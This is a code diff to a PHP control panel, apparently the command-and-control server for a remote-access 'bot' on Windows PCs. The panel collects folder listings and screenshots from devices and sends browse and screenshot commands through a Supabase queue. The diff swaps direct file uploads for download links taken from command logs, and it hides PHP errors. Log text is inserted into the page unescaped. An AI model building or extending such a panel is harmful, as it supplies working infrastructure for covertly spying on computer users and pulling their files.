@@ -1,7 +1,7 @@
 <?php
 ob_start(); 
 session_start();
-error_reporting(E_ALL); ini_set('display_errors', 1);
+error_reporting(0); ini_set('display_errors', 0);
 date_default_timezone_set('Europe/Moscow');
 
 define('SUPABASE_URL', 'https://bvskbsonxlntkpgywnoh.supabase.co/rest/v1');
@@ -47,7 +47,7 @@ function cleanOldFiles() {
     }
 }
 
-// 1. ПРИЕМ ФАЙЛОВ И ДАННЫХ ОТ БОТА
+// 1. ПРИЕМ ДАННЫХ И СНИМКОВ ЭКРАНА ОТ БОТА
 if (isset($_POST['screenshot_device_id'])) {
     $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['screenshot_device_id']);
     
@@ -55,32 +55,6 @@ if (isset($_POST['screenshot_device_id'])) {
         file_put_contents($cache_dir . $dev_id . '_tree.txt', $_POST['folder_structure']);
         file_put_contents($cache_dir . $dev_id . '_path.txt', $_POST['current_path'] ?? 'C:\\');
         echo "SERVER_SAVED_STRUCTURE"; 
-        exit;
-    }
-    
-    if (isset($_FILES['downloaded_file'])) {
-        $upload_dir = __DIR__ . '/downloads/';
-        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
-        
-        if ($_FILES['downloaded_file']['error'] === UPLOAD_ERR_INI_SIZE || $_FILES['downloaded_file']['error'] === UPLOAD_ERR_FORM_SIZE) {
-            echo "SERVER_ERROR_FILE_TOO_LARGE";
-            exit;
-        }
-
-        if ($_FILES['downloaded_file']['error'] !== UPLOAD_ERR_OK) {
-            echo "SERVER_ERROR_UPLOAD_CODE_" . $_FILES['downloaded_file']['error'];
-            exit;
-        }
-
-        $filename = !empty($_POST['download_filename']) ? basename($_POST['download_filename']) : basename($_FILES['downloaded_file']['name']);
-        $target_file = $upload_dir . $dev_id . '_' . $filename;
-        
-        if (move_uploaded_file($_FILES['downloaded_file']['tmp_name'], $target_file)) {
-            file_put_contents($cache_dir . $dev_id . '_lastfile.txt', $filename);
-            echo "SERVER_SAVED_FILE";
-        } else {
-            echo "SERVER_ERROR_MOVE";
-        }
         exit;
     }
     
@@ -164,7 +138,6 @@ if (isset($_GET['api_refresh_all'])) {
             
             $tree_file = $cache_dir . $id . '_tree.txt';
             $path_file = $cache_dir . $id . '_path.txt';
-            $last_file_ptr = $cache_dir . $id . '_lastfile.txt';
             $screen_file = __DIR__ . '/screenshots/screen_' . $id . '.jpg';
             
             $time_raw = $d["time"] ?? ""; 
@@ -185,7 +158,6 @@ if (isset($_GET['api_refresh_all'])) {
                 "is_online" => $isOnline,
                 "last_seen" => $formatted_last_seen,
                 "current_path" => file_exists($path_file) ? file_get_contents($path_file) : 'C:\\',
-                "last_file" => file_exists($last_file_ptr) ? file_get_contents($last_file_ptr) : '',
                 "items" => file_exists($tree_file) ? json_decode(file_get_contents($tree_file), true) : [],
                 "has_screenshot" => file_exists($screen_file),
                 "screenshot_time" => file_exists($screen_file) ? filemtime($screen_file) : 0
@@ -195,17 +167,6 @@ if (isset($_GET['api_refresh_all'])) {
     
     $logs = supabaseRequest('/commands?select=*&order=id.desc');
     echo json_encode(["devices" => $explorer_data, "logs" => is_array($logs) ? $logs : []]);
-    exit;
-}
-
-if (isset($_GET['get_file']) && isset($_GET['dev'])) {
-    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['dev']);
-    $file = __DIR__ . '/downloads/' . $dev_id . '_' . basename($_GET['get_file']);
-    if (file_exists($file)) {
-        header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="' . basename($_GET['get_file']) . '"');
-        readfile($file);
-    } else { echo "Файл не найден на сервере."; }
     exit;
 }
 
@@ -280,15 +241,6 @@ button, .btn-link{ width:100%; margin-top:8px; padding:10px; border-radius:8px; 
 .exp-btn { background:none; border:none; color:#60a5fa; text-align:left; padding:0; width:auto; margin:0; display:inline; font-weight:normal; font-family:monospace; cursor:pointer;}
 .exp-btn:hover { text-decoration:underline; color:#93c5fd; }
 
-.download-ready-box {
-    background: #064e3b;
-    border: 1px solid #059669;
-    border-radius: 8px;
-    padding: 12px;
-    margin-top: 12px;
-    text-align: center;
-}
-
 .log-section{ margin:24px; background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; overflow-x:auto;}
 table{ width:100%; border-collapse:collapse; font-size:13px;}
 th, td{ padding:12px; border-bottom:1px solid #1f2937; text-align:left;}
@@ -332,7 +284,6 @@ th { color: #64748b; font-size: 11px; text-transform: uppercase;}
 <script>
 let explorerScrollPositions = {};
 
-// Безопасное кодирование в Base64 для избежания ошибок в кавычках и символах
 function encodePath(str) {
     return btoa(encodeURIComponent(str));
 }
@@ -406,15 +357,6 @@ function startRealtimeMonitor() {
                         });
                     }
 
-                    let downloadBtnHtml = '';
-                    if (pc.last_file) {
-                        downloadBtnHtml = `
-                        <div class="download-ready-box">
-                            <span style="font-size:12px; color:#a7f3d0; font-weight:bold; display:block;">Файл успешно получен:</span>
-                            <a href="?get_file=${encodeURIComponent(pc.last_file)}&dev=${id}" class="btn-link green" style="background:#10b981; margin-top:6px; font-weight:bold;">💾 СКАЧАТЬ НА ЭТОТ ПК: ${pc.last_file}</a>
-                        </div>`;
-                    }
-
                     let screenshotBtnHtml = pc.has_screenshot ? `<a href="?download_screen=${id}&v=${pc.screenshot_time}" class="btn-link green" target="_blank" style="margin-bottom:6px; background:#4f46e5;">📥 Посмотреть скриншот</a>` : '';
 
                     containerHtml += `
@@ -432,8 +374,6 @@ function startRealtimeMonitor() {
                         <button type="button" class="blue" style="background:#0284c7; margin:0;" onclick="sendCmdAsync('${id}', 'get_files', 'C:\\\\')">🔄 Корень диска C:</button>
                         
                         <div class="explorer-box" data-devid="${id}">${explorerHtml}</div>
-                        
-                        ${downloadBtnHtml}
 
                         <hr style="border-color:#1f2937; margin:15px 0;">
                         <button type="button" class="blue" onclick="sendCmdAsync('${id}', 'take_screenshot')">📸 Скриншот</button>
@@ -465,18 +405,45 @@ function startRealtimeMonitor() {
                     logsHtml = `<tr><td colspan="4" style="color:#4b5563; text-align:center;">Отчетов нет</td></tr>`;
                 } else {
                     data.logs.forEach(l => {
+                        let logText = l.log || '';
+                        let statusHtml = '';
+
+                        // 1. Прогресс-бар для больших файлов
+                        if (logText.includes('Загрузка:') && logText.includes('%')) {
+                            let match = logText.match(/Загрузка:\s*(\d+)%/);
+                            let percent = match ? match[1] : 0;
+
+                            statusHtml = `
+                            <div style="width: 100%; max-width: 320px;">
+                                <div style="font-size:11px; margin-bottom:4px; color:#60a5fa; font-weight:bold;">${logText}</div>
+                                <div style="background:#1e293b; border-radius:6px; height:14px; width:100%; overflow:hidden; border:1px solid #334155;">
+                                    <div style="background: linear-gradient(90deg, #10b981, #34d399); width:${percent}%; height:100%; transition: width 0.4s ease-in-out;"></div>
+                                </div>
+                            </div>`;
+                        } 
+                        // 2. Зеленая кнопка скачивания при завершении
+                        else if (logText.includes('http://') || logText.includes('https://')) {
+                            statusHtml = logText.replace(/(https?:\/\/[^\s]+)/g, function(url) {
+                                return `<a href="${url}" target="_blank" class="btn-link green" style="display:inline-block; width:auto; padding:6px 14px; font-size:12px; margin:2px 0; text-decoration:none; background:#10b981; color:#ffffff; border-radius:6px; font-weight:bold;">💾 Скачать файл</a>`;
+                            });
+                        } 
+                        // 3. Обычный статус
+                        else {
+                            statusHtml = logText;
+                        }
+
                         logsHtml += `<tr>
                             <td style="font-family:monospace; color:#64748b;">${l.id}</td>
                             <td style="font-family:monospace;">${l.device_id}</td>
                             <td style="color:#60a5fa;">${l.action}</td>
-                            <td style="font-weight:600; color:${(l.log||'').includes('Ошибка') ? '#ef4444' : '#10b981'};">${l.log || ''}</td>
+                            <td style="font-weight:600; color:${logText.includes('Ошибка') ? '#ef4444' : '#10b981'};">${statusHtml}</td>
                         </tr>`;
                     });
                 }
                 logsBody.innerHTML = logsHtml;
             }
         })
-        .catch(err => console.error("Ошибка:", err));
+        .catch(err => console.error("Ошибка обновления:", err));
     }, 1500);
 }
 
